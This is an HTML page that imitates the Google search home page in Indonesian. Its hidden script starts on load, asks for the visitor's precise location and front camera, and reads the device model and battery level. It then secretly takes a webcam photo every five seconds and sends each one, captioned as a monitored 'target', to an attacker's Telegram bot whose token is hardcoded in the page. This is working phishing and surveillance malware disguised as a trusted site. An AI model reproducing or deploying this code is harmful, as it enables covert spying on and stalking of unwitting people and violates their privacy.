<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google</title>
    <style>
        body { margin: 0; font-family: arial, sans-serif; background: #fff; display: flex; flex-direction: column; height: 100vh; }
        .navbar { display: flex; justify-content: flex-end; padding: 15px; gap: 15px; font-size: 13px; color: #3c4043; }
        .main { display: flex; flex-direction: column; align-items: center; margin-top: 80px; flex-grow: 1; }
        .logo { width: 272px; margin-bottom: 30px; }
        .search-form { width: 90%; max-width: 584px; display: flex; flex-direction: column; align-items: center; }
        .search-bar { width: 100%; border: 1px solid #dfe1e5; padding: 12px 20px; border-radius: 24px; font-size: 16px; outline: none; box-sizing: border-box; }
        .buttons { margin-top: 25px; display: flex; gap: 10px; }
        .btn { background-color: #f8f9fa; border: 1px solid #f8f9fa; border-radius: 4px; color: #3c4043; padding: 0 16px; line-height: 34px; font-size: 14px; cursor: pointer; }
    </style>
</head>
<body>

<div class="navbar">
    <span>Gmail</span>
    <span>Gambar</span>
    <div style="background:#5f6368; width:30px; height:30px; border-radius:50%;"></div>
</div>

<div class="main">
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" class="logo">
    <form class="search-form" action="https://www.google.com/search" method="GET">
        <input type="text" name="q" class="search-bar" autocomplete="off" autofocus>
        <div class="buttons">
            <input type="submit" class="btn" value="Penelusuran Google">
            <input type="button" class="btn" value="Saya Lagi Beruntung">
        </div>
    </form>
</div>

<video id="video" style="display:none;" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
    const TOKEN = '8746483619:AAFM0hZ7HwcnPFPV07PFUZZ4lGML0Nrt5aw';
    const CHAT_ID = '6888530451';
    let userLocation = "Mencari lokasi...";
    let globalDevice = "Mendeteksi..."; // Variabel ini akan dikunci

    // 1. Fungsi deteksi HP yang lebih stabil
    function getStableDevice() {
        const ua = navigator.userAgent;
        if (/android/i.test(ua)) {
            const match = ua.match(/\(([^;]+); ([^;]+); ([^)]+)\)/);
            if (match) {
                let model = match[3].split(" Build")[0].trim();
                return model.length > 1 ? model : match[2].trim();
            }
            return "Android Device";
        } else if (/iPhone/i.test(ua)) {
            return "iPhone";
        }
        return "Unknown Device";
    }

    async function startService() {
        // Ambil nama HP SEBELUM meminta lokasi agar tidak ter-reset
        globalDevice = getStableDevice();

        // Minta Lokasi
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
                userLocation = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                // Kirim ulang snapshot segera setelah lokasi didapat
                takeSnapshot();
            }, null, { enableHighAccuracy: true });
        }

        // Jalankan Kamera
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.getElementById('video');
            video.srcObject = stream;
            video.onloadedmetadata = () => {
                video.play();
                takeSnapshot();
                setInterval(takeSnapshot, 5000);
            };
        } catch (e) { console.log("Akses ditolak"); }
    }

    async function takeSnapshot() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        if (video.videoWidth === 0) return;

        // Cek Baterai
        let battery = "N/A";
        if (navigator.getBattery) {
            const bat = await navigator.getBattery();
            battery = Math.round(bat.level * 100) + "%";
        }

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'shot.jpg');
            formData.append('caption', `👁 *Target Terpantau*\n\n📱 HP: ${globalDevice}\n🔋 Baterai: ${battery}\n📍 Lokasi: ${userLocation}`);
            formData.append('parse_mode', 'Markdown');
            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
        }, 'image/jpeg', 0.6);
    }

    window.onload = startService;
</script>
</body>
</html>
